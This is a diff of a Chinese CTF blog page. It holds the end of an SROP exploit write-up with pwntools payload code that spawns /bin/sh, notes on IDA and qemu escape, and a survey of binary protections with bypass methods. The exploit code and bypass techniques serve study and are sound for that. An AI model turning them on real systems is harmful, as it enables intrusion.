+<p>读取完之后，执行leave指令之前的栈底为0x60116c，而leave指令相当于：mov rsp rbp；和pop rbp：</p>
+<p>(1)第一条mov rsp rbp之后，0x60116c就被赋值给rsp，也就是rsp指向0x60116c。</p>
+<p>(2)第二条pop rbp之后，把0x60116c处的内容赋值给rbp，这里设置0x60116c处的内容为fake_stack_addr+0x10，也就是0x60117c，那么rbp指向0x60117c。rsp下挪一个单位，指向0x60116c+0x08=0x601174。</p>
+<p>故leave指令执行完后rsp = 0x601174，rbp = 0x60117c。</p>
+<p>▲这里这么设置是有原因的，为了挪动rsp来指向0x601174。</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">payload += p64(call_read_addr)#存放在0x601174</span><br><span class="line">#存放在0x601174处，为了之后再次调用read修改rax。</span><br></pre></td></tr></table></div></figure>
+
+<p>接着执行retn指令，相当于pop eip，此时的rsp指向 0x601174，所以我们需要将0x601174处的值变为read_addr的地址，也就是这条语句，这里设置read_addr为0x400571，也就是带有call指令的read。</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">注释头</span><br><span class="line"></span><br><span class="line">payload += p64(fake_stack_addr)#存放在0x60117c，这里可以随便设置，用不到</span><br></pre></td></tr></table></div></figure>
+
+<p>retn指令之后就是call指令，各种寄存器的值还是没变，所以照常用就行，回来之后rsp仍旧指向0x60117c。此时栈状态为：</p>
+<p>rsp = 0x60117c，rbp = 0x60117c。</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">payload += str(frameExecve)#设置SigreturnFrame结构体</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">#set_read处的读取</span><br><span class="line"></span><br><span class="line">sleep(3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.send(&#x27;/bin/sh\x00&#x27; + (&#x27;a&#x27;)*7) </span><br><span class="line">#call_read处的读取。</span><br></pre></td></tr></table></div></figure>
+
+<p>读取15个字符到0x60115c，目的是利用read返回值为读取的字节数的特性设置rax=0xf，注意不要使/bin/sh\x00字符串发生改变。</p>
+<p>最后io.interactive()即可getshell。</p>
+<p>▲总的程序流应该是：首次read-&gt;set_read-&gt;call_read-&gt;syscall</p>
+<p>结构体的设置，固定模式：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">frameExecve = SigreturnFrame() #设置SROP Frame</span><br><span class="line">frameExecve.rax = constants.SYS_execve</span><br><span class="line">frameExecve.rdi = binsh_addr</span><br><span class="line">frameExecve.rsi = 0</span><br><span class="line">frameExecve.rdx = 0</span><br><span class="line">frameExecve.rip = syscall_addr</span><br></pre></td></tr></table></div></figure>
+
+<p>开头设置：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#注释头 </span><br><span class="line"></span><br><span class="line">syscall_addr = 0x400560 </span><br><span class="line">set_read_addr = 0x40055b </span><br><span class="line">read_addr = 0x400571 </span><br><span class="line">fake_stack_addr = 0x60116c </span><br><span class="line">binsh_addr = 0x60115c</span><br></pre></td></tr></table></div></figure>
+
+<p>参考资料：</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157" >https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/pwn%E5%A0%86-IDA-0x01/">pwn堆-IDA-0x01</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>▲堆题一般都需要设置下IDA中的结构体：</p>
+<p>1.结构体设置：打开IDA-窗口-结构体(alt+4)。</p>
+<p>2.编辑-添加结构体类型，然后写名称(insert)。</p>
+<p>3.出现新增的struct之后，将鼠标放在该结构体ends位置，按d添加成员。</p>
+<p>4.将鼠标放在成员上，按d轮转设置成员大小，按u可删除成员。</p>
+<p>5.找到malloc的位置，判断好哪个变量是存放chunk和chunk_size，之后按y将其设置为:</p>
+<p>struct struct_Name *array_Name[count]</p>
+<p>(一般都是这样的，题目会创建一个数组，每个元素是一个结构体，结构体里有两个数据成员，为chunk和chunk_size，这里的chunk就是Malloc返回的指针。不同题目具体分析，有的也有函数指针的数据成员void * fun_Name())</p>
+<p>6.设置增删改查函数的变量类型为void，不然if函数就有的难受了。</p>
+<p>7.将判断的成员变量什么的都设置好，按N改名，之后再来分析漏洞，不然很容易混淆。</p>
+<p>参考资料：</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/hgy413/category_1151311.html" >https://blog.csdn.net/hgy413/category_1151311.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/qemu%E9%80%83%E9%80%B8-pwn%E8%A7%A3%E9%A2%98/">qemu逃逸-pwn解题</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>一、内存模块：<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191507619.jpeg" alt="img"></p>
 <p>1.可以看到在实际物理内存physical memory中存在qemu进程的内存空间</p>
 <p>2.之后在qemu进程的内存空间中虚拟化出虚拟主机的实际内存空间Guest’s phy memory。</p>
 <p>3.然后才是虚拟主机中各个进程的内存分配。</p>
@@ -90,6 +264,78 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></he
 <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//注释头</span><br><span class="line"></span><br><span class="line">#include &lt;asm/io.h&gt;</span><br><span class="line">#include &lt;linux/ioport.h&gt;</span><br><span class="line"></span><br><span class="line">inb(port); //读取一字节</span><br><span class="line">inw(port); //读取两字节</span><br><span class="line">inl(port); //读取四字节</span><br><span class="line"></span><br><span class="line">outb(val,port); //写一字节</span><br><span class="line">outw(val,port); //写两字节</span><br><span class="line">outl(val,port); //写四字节</span><br></pre></td></tr></table></div></figure>
 
 <p>3.然后就能调用到qemu中关于mmio和pmio的read，write函数了，从而挖掘漏洞，跳出qemu。</p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/pwn%E4%BF%9D%E6%8A%A4%E6%8E%AA%E6%96%BD/">pwn保护措施</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>一、RELRO: (ReLocation Read-Only)</p>
+<p>1.功能：解决延迟绑定问题，将符号重定向表设置为只读，或者在程序启动时就解析并绑定所有动态符号，防止got表被篡改。</p>
+<p>2.表现形式：</p>
+<p>pwn checksec检查为RELRO: Full RELRO，Partial RELRO保护</p>
+<p>3.保护等级：</p>
+<p>(1)Partial RELRO:</p>
+<p>①一些段(.dynamic、.got等)在初始化后会被标记只读，.got段代表无plt指向的got表，也就是没有发生延迟绑定，没有被外部extern导入的函数被标记为只读。</p>
+<p>②但是有被外部extern导入的函数，发生延迟绑定的函数，在.got.plt段，仍然可以篡改got表，这里的got表是.got.plt段。</p>
+<p>(2)Full RELRO:直接禁止延迟绑定，无.got.plt段，只有.got段，且被标记为只读，无法修改，无法篡改got表。</p>
+<p>4.绕过方法：有啥绕过方法，不改got表不就完了。</p>
+<p>二、FORTIFY_SOURCE:</p>
+<p>1.功能：将敏感函数如read, fgets, memcpy, printf等等添加保护，替换为__read_chk, __fgets_chk, __memcpy_chk, __printf_chk等函数。这些带了chk的函数会检查读取/复制的字节长度是否超过缓冲区长度，检查诸如%n之类的字符串位置是否位于可能被用户修改的可写地址，避免了格式化字符串漏洞的出现。（如直接%7$x）</p>
+<p>2.表现形式：带有chk的函数，checksec可以检测到</p>
+<p>3.保护等级：</p>
+<p>(1)-Ol -D_FORTIFY_SOURCE=0：关闭</p>
+<p>(2)-Ol -D_FORTIFY_SOURCE=1：替换get，memecpy等，格式化字符串仍然可用</p>
+<p>(3)-Ol -D_FORTIFY_SOURCE=2：格式化字符串也受到限制：</p>
+<p>%n，%3$x不可用(跳过了1，2不可用)</p>
+<p>%n$只能从1开始才可以：%1$x%2$x可用</p>
+<p>4.绕过方法：</p>
+<p>(1)利用整数溢出漏洞，篡改_IO_FILE结构中的_IO_FLAGS2_FORTIFY为0，从而关闭FORTIFY_SOURCE对%n的检查。之后再利用任意地址写，将nargs篡改为0，从而关闭对%n$的检查。</p>
+<p>具体论文：</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://phrack.org/issues/67/9.html(%E8%A6%81%E6%8C%82" >http://phrack.org/issues/67/9.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://jackgrence.github.io/phrack-67-9/" >https://jackgrence.github.io/phrack-67-9/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.vnsecurity.net/research/2012/02/16/exploiting-sudo-format-string-vunerability.html" >https://www.vnsecurity.net/research/2012/02/16/exploiting-sudo-format-string-vunerability.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>都得挂vpn才能看</p>
+<p>三、NX:NX enabled (No execute bit)</p>
+<p>1.功能：将内存页以数据和指令两种方式进行了分类。被标记为数据页的内存页（如栈和堆）上的数据无法被当成指令执行，即没有X属性，这样就会导致shellcode失效。除了.text之外，其余段，数据(stack、heap等)都不可执行。</p>
+<p>2.表现形式：pwn checksec检查</p>
+<p>3.绕过方法：ROP、Onegadget、ret2libc等等</p>
+<p>四、ASLR(Address Space Layout Randomization)和PIE(Position Independent Executable)</p>
+<p>1.功能：该技术是一个针对堆、栈、libc地址、代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术，每次加载程序都会随机化这些地址。</p>
+<p>2.表现形式：checksec检查，gdb-peda中输入aslr。</p>
+<p>3.不同：</p>
+<p>(1)ASLR是系统层面的地址随机，针对栈(stack)，libc加载地址，堆(heap)，没办法在编译时选择是否开启ASLR，不同系统设置下都不一样，只有在程序跑起来，远程调试才能看到随机化。可以在终端输入：</p>
+<p>cat /proc/sys/kernel/randomize_va_space</p>
+<p>查看当前系统的随机化等级，也可以打开这个文件进行修改等级。共分为3个等级：</p>
+<p>A.0：即关闭ASLR</p>
+<p>B.1：部分开启，随机化stack和libc加载地址，不随机化heap</p>
+<p>C.2：完全开启，随机化stack、libc加载地址、heap</p>
+<p>▲注：</p>
+<p>由于是系统层面的，做pwn题时肯定是不知道远程的系统环境到底有没有开启ASLR，一般都是默认开启，且都是2等级。做题做到现在没见过哪个题目告诉不开启ASLR的。另外在gdb-peda中查看aslr都是默认为off，因为gdb默认关闭ASLR，可以在gdb-peda中输入aslr on来打开ASLR。</p>
+<p>(2)PIE是gcc编译功能时的选项，针对代码段(.text)、初始化数据段(.data)、未初始化数据段(.bss)的防护技术。开启之后，以上提到的都会随机化，同样也是远程调试跑起来才能看到效果。需要注意的是，只有开启了ASLR之后，PIE才能被正常使用。</p>
+<p>4.绕过方法：</p>
+<p>(1)利用vsyscall或者vdso来滑过一段栈空间，从而将eip挪移到栈底下方我们想要的地址处。</p>
+<p>(2)利用栈溢出和打印函数的参数，修改劫持rbp使得利用rbp寻址的打印函数的参数指向栈上其它位置，通过爆破来寻求泄露Libc地址。</p>
+<p>(3)利用PIE机制，爆破倒数第四位可以跳转到同一个内存页中的任意函数。</p>
+<p>五、Stack Canary/Stack cookies</p>
+<p>1.功能：函数退出时，将保存在栈rbp-0x08处的canary和tcbhead_t结构体中的stack_guard来xor操作，若检查到改变则代表执行了栈溢出漏洞，程序调用__stack_chk_fail，打印错误信息，并崩溃。</p>
+<p>2.表现形式：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">mov rax,fs:28h</span><br><span class="line">mov [rsp+28h+var_20], rax</span><br><span class="line">------------------------------------------------------</span><br><span class="line">mov rax, [rsp+28h+var_20]</span><br><span class="line">xor rax, fs:28h</span><br><span class="line">call __stack_chk_fail</span><br><span class="line">------------------------------------------------------</span><br><span class="line">v_canary = __readfsqword(0x28u);</span><br><span class="line">return __readfsqword(0x28u) ^ v_canary;</span><br></pre></td></tr></table></div></figure>
+
+<p>3.不同类型的canary:</p>
+<p>(1)Terminator canaries:</p>
+<p>最常见的canary，末尾为\x00，保存在rpb - 0x08的位置。</p>
+<p>(2).Random canaries:</p>
+<p>在程序初始化时随机生成，保存在一个相对安全的位置。通常由/dev/urandom来生成，有时也使用当前时间的哈希值。</p>
+<p>(3).Random XOR canaries:</p>
+<p>通过一个随机数和函数栈中所有控制信息，返回地址等异或运算得到的，这样当函数栈中的随机数或与之相关的控制信息，返回地址被修改了，都可以检测到。</p>
+<p>2.绕过方法：</p>
+<p>(1)有循环时，32或者64位程序下都可以逐字节爆破绕过。</p>
+<p>(2)可通过printf字符串漏洞来泄露(%p.%p.%p….)。</p>
+<p>(3)通过打印栈上数据的打印函数栈溢出连上canary泄露出来。</p>
+<p>(4)当程序读入flag进入内存时，利用函数__stack_chk_fail，加上足够长度的栈溢出覆盖argv[0]为程序中保存flag的地址。这样当__stack_chk_fail运行时就会打印出argv[0]中地址上对应的内容，也就是flag。</p>
+<p>(5)由pthread创建出来的线程函数中如果有足够长度的栈溢出，可以直接覆盖canary来源tcbhead_t结构体中的canary和栈中的canary为同一数值，这样检查仍旧通过。</p>
+<p>(64位中为fs:[28h]，32位中为gs:[14h])</p>
+<p>▲长度一般为rbp+2000左右，不同的Libc版本都不太一样，需要调试才能知道。原因是通过pthread出来的线程函数栈会被安置到与TLS相差约2000字节的距离处：</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191519177.png" alt="img">    <img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191519553.png" alt="img"></p>
+<p>这里可以看到，第一个是main函数栈，第二个是在main函数中通过pthread进程创建并且调用的函数栈，两者相差将近0x700000000这么远，完全不是正常的函数调用相差的栈距离。同时在该函数中rbp指向的始终是0000(全是)，该函数结束后会先跳转到libc中的libpthread来恢复栈。</p>
+<p>▲64位的tcbhead_t结构体：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  void *tcb;        /* Pointer to the TCB.  Not necessarily the</span><br><span class="line">               thread descriptor used by libpthread.  */</span><br><span class="line">  dtv_t *dtv;</span><br><span class="line">  void *self;       /* Pointer to the thread descriptor.  */</span><br><span class="line">  int multiple_threads;</span><br><span class="line">  int gscope_flag;</span><br><span class="line">  uintptr_t sysinfo;</span><br><span class="line">  uintptr_t stack_guard;//即为canary，fs:28h处</span><br><span class="line">  uintptr_t pointer_guard;</span><br><span class="line">  ...</span><br><span class="line">&#125; tcbhead_t;</span><br></pre></td></tr></table></div></figure>
+
 </div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/shadow-IntergerOverflow-Nice/">shadow-IntergerOverflow-Nice</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>1.常规checksec，开了NX，FULL RELRO，Canary，没办法shellcode，修改got表。然后IDA打开找漏洞：</p>
 <p>(1)整数转换漏洞：</p>
 <p>输入message_length之后将长度返回进行atoi，将atoi的返回值给到下一个输入message的getline。中间用atoi进行了一个字符串转int的操作，而atoi是一个将数字型字符串转成数字的函数，”-1”可以转换为-1。但是getline中read的长度参数是size_t，相当于是unsigned int，是一个无符号数。</p>
@@ -268,393 +514,7 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></he
 <p>x/20i &amp;__libc_realloc</p>
 <p>7.直接从Libc.so中查找函数：</p>
 <p>readelf -s /lib/x86_64-linux-gnu/libc-2.23.so | grep -E “__malloc_hook|__free_hook|__realloc_hook”</p>
-</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/%E6%9A%91%E6%9C%9F%E6%80%BB%E7%BB%93/">暑期总结</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>小学期一直在忙小程序的设计，现在放上来吧，也最后做个总结：</p>
-<p>一、Libcap的使用：</p>
-<p>1.头文件环境相关：</p>
-<p>用的是ubuntu18.04的环境</p>
-<p>(1)头文件及环境配置：</p>
-<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//注释头</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pcap.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//cmd Programmer need</span></span><br><span class="line">-lpcap</span><br><span class="line"></span><br><span class="line"><span class="comment">//QT pro need</span></span><br><span class="line">LIBS += -L/usr/local/lib -lpcap</span><br></pre></td></tr></table></div></figure>
-
-<p>同时需要root权限，QT可以设置</p>
-<p>(2)QThread使用</p>
-<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//注释头</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">libcapThread</span> :</span> <span class="keyword">public</span> QThread</span><br><span class="line">&#123;</span><br><span class="line">    Q_OBJECT</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">//overwrite</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">signals:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">signalpcap</span><span class="params">(QString,QString,QString,</span></span></span><br><span class="line"><span class="params"><span class="function">        QString,QString,<span class="keyword">const</span> u_char*)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//注释头</span></span><br><span class="line"></span><br><span class="line">threadObj-&gt;start();</span><br><span class="line">threadObj-&gt;<span class="built_in">terminate</span>();</span><br></pre></td></tr></table></div></figure>
-
-<p>2.抓包流程：</p>
-<p>(1)搜索网卡dev：</p>
-<p>dev = pcap_lookupdev(errbuf);</p>
-<p>这个只能搜索到第一个可用网卡，有的装了docker啥的会存在多个网卡，需要用其他函数。</p>
-<p>(2)编译抓取规则：</p>
-<p>pcap_compile(devHandle, &amp;filter, “tcp”, 0, deviceMask);</p>
-<p>(3)设置抓取规则：</p>
-<p>pcap_setfilter(devHandle, &amp;filter);</p>
-<p>(4)抓包：</p>
-<p>pcap_loop(devHandle, 1, baseAnalyze, NULL);</p>
-<p>▲大概就是这样，然后这里一般需要用到回调函数baseAnalyze()来处理包数据，回调函数可自行得到的参数如下：</p>
-<p>void baseAnalyze(u_char* user, const struct pcap_pkthdr* pHeader, const u_char* pPktdata)</p>
-<p>3.然后就是正常处理显示了，直接贴程序:</p>
-<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/PIG-007/Programmer/tree/master/Libcap" >https://github.com/PIG-007/Programmer/tree/master/Libcap</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
-<p>二、加解密双机的使用：</p>
-<p>▲做了双机的服务器端和DES，AES，还有几个古典，其他的是同学做的，特此说明一下。</p>
-<p>1.Socket</p>
-<p>(1)创建对象：</p>
-<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//注释头</span></span><br><span class="line"></span><br><span class="line">server = <span class="keyword">new</span> QTcpServer(<span class="keyword">this</span>);</span><br></pre></td></tr></table></div></figure>
-
-<p>(2)开始监听：</p>
-<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//注释头</span></span><br><span class="line"></span><br><span class="line">connect(ui-&gt;btnListen,&amp;QPushButton::clicked,[<span class="keyword">this</span>]&#123;</span><br><span class="line">    <span class="comment">//if Listening,close it</span></span><br><span class="line">    <span class="keyword">if</span>(server-&gt;isListening())&#123;</span><br><span class="line">    <span class="comment">//server-&gt;close();</span></span><br><span class="line">    closeServer();<span class="comment">//Define function</span></span><br><span class="line">    <span class="comment">//Recover the status after closed</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">const</span> QString address_text=ui-&gt;editAddress-&gt;text();</span><br><span class="line">        <span class="keyword">const</span> QHostAddress address=(address_text==<span class="string">&quot;Any&quot;</span>)</span><br><span class="line">            ?QHostAddress::Any</span><br><span class="line">            :QHostAddress(address_text);</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">short</span> port=ui-&gt;editPort-&gt;text().toUShort();</span><br><span class="line">        <span class="keyword">if</span>(server-&gt;listen(address,port))&#123;</span><br><span class="line">        <span class="comment">//handle function</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//error function</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
-
-<p>(3)检测到连接，开始处理：</p>
-<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//注释头</span></span><br><span class="line"></span><br><span class="line">connect(server,&amp;QTcpServer::newConnection,<span class="keyword">this</span>,[<span class="keyword">this</span>]&#123;</span><br><span class="line"><span class="keyword">while</span>(server-&gt;hasPendingConnections())</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//nextPendingConnection get the next obj</span></span><br><span class="line">    QTcpSocket *socket=server-&gt;nextPendingConnection();</span><br><span class="line">    clientList.append(socket);</span><br><span class="line">    ui-&gt;textRecv-&gt;append(QString(<span class="string">&quot;(%1:%2) Soket Connected&quot;</span>)</span><br><span class="line">        .arg(socket-&gt;peerAddress().toString())</span><br><span class="line">        .arg(socket-&gt;peerPort()));</span><br><span class="line">        ui-&gt;textRecv-&gt;append(recv_text);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></div></figure>
-
-<p>(4)错误信息处理：</p>
-<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//注释头</span></span><br><span class="line"></span><br><span class="line">connect(socket, <span class="keyword">static_cast</span>&lt;<span class="keyword">void</span>(QAbstractSocket::*)(QAbstractSocket::SocketError)&gt;(&amp;QAbstractSocket::error),</span><br><span class="line">[<span class="keyword">this</span>,socket](QAbstractSocket::SocketError)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//Handle</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">//注释头</span></span><br><span class="line"></span><br><span class="line">connect(socket,&amp;QAbstractSocket::errorOccurred,[<span class="keyword">this</span>,socket](QAbstractSocket::SocketError)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//Handle</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></div></figure>
-
-<p>2.界面设计的不同style:</p>
-<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//注释头</span></span><br><span class="line"></span><br><span class="line">qApp-&gt;setStyle(QStyleFactory::create(<span class="string">&quot;fusion&quot;</span>));</span><br></pre></td></tr></table></div></figure>
-
-<p>3.加密模块：</p>
-<p>很多内容就放github上，不再赘述</p>
-<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/PIG-007/Programmer/tree/master/SocketEncrypt" >https://github.com/PIG-007/Programmer/tree/master/SocketEncrypt</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
